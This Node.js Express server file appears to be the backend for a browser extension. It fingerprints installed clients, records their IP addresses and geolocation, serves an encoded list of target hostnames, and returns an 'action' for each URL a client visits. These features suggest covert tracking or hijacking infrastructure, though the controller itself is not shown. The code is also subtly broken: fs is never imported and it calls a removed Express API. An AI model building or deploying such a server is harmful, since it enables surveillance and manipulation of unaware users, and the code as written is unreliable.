const ActionController = require('./controller.js')
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const mongoURI = "mongodb://localhost:27017/gEngine"
var express = require("express");
var parse = require('url-parse')
var router = express.Router();

var privateKey = fs.readFileSync('/etc/letsencrypt/live/wupdater.guru/privkey.pem');
var certificate = fs.readFileSync('/etc/letsencrypt/live/wupdater.guru/fullchain.pem');

var credentials = {key: privateKey, cert: certificate};


var app = express.createServer(credentials);

app.use(
  express.urlencoded({
    extended: true
  })
)

app.use(express.json())

async function init(){

  async function run() {
    await mongoose.connect(mongoURI, {
      useUnifiedTopology: true,
      useNewUrlParser: true
    })
  }
  await run().catch(console.dir)

  //Schemas
  const ConfigSchema = new mongoose.Schema({
    hostnames: [String],
    disallow_domains: [String],
    disallow_installDomains: [String],
    updateConfigEvery: Number,
    pingEvery: Number
  },{
    collection: 'config'
  })

  const ClientSchema = new mongoose.Schema({
    uid: { type: String, index: {unique: true, dropDups: true} },
    exid: String,
    fingerprint: Number,
    ip: String,
    geo: { lat: Number, lon: Number },
    ping: Date,
    installed: { type: Date, default: new Date().toISOString() }
  })

  const Client = mongoose.model('Client', ClientSchema)
  const Config = mongoose.model('Config', ConfigSchema)


  // middleware that is specific to this router
  app.use(async function(req, res, next) {
    const uid = req.header('ex-uid')
    const exid = req.header('ex-id')
    const fingerprint = req.header('ex-fingerprint')
    if(uid === undefined || exid === undefined || fingerprint === undefined){
      res.json({'status': 'false'})
    } else {
      next();
    }
  });

  app.post("/ping/", async function(req, res, next) {

    const uid = req.header('ex-uid')
    const exid = req.header('ex-id')
    const fingerprint = req.header('ex-fingerprint')
    const geo = req.body.geo
    let cursor = await Client.find({'exid': exid, 'uid': uid}).limit(1)
    if (cursor.length === 0){
      const newClient = new Client({
        uid: uid,
        exid: exid,
        fingerprint: fingerprint,
        ip: req.ip,
        geo: { lat: geo.lat, lon: geo.lon },
        ping: new Date().toISOString()
      })

      await newClient.save((err) => {
        if(err) return console.log(err);
      })
    } else {
      let newData = {ping: new Date().toISOString()}
      if(cursor[0].ip != req.ip){
        newData = { ...newData, ...{ ip: req.ip } }
      }
      Client.updateOne({_id: cursor[0]._id}, newData, (err, doc) => {
        if(err) return console.log(err);
      })
    }
    res.json({'status': 'ok'});
  });

  app.get("/getconfig/", async function(req, res, next) {
    var config = await Config.findOne().select(['-_id'])
    config.hostnames = config.hostnames.map(btoa)
    const response = {...config._doc, ...{status: 'ok'}}
    res.json(response)
  });

  app.post("/getaction/", (req, res, next) => {
    url = parse(req.body.url, true)
    const Controller = new ActionController(url)
    let action = Controller.findAction()
    console.log(url)
    const response = {...{action: action}, ...{status: 'ok'}}
    res.json(response);
  });

  app.listen(80, '0.0.0.0', () => {
    console.log("Server running on port 80");
  });

}

init();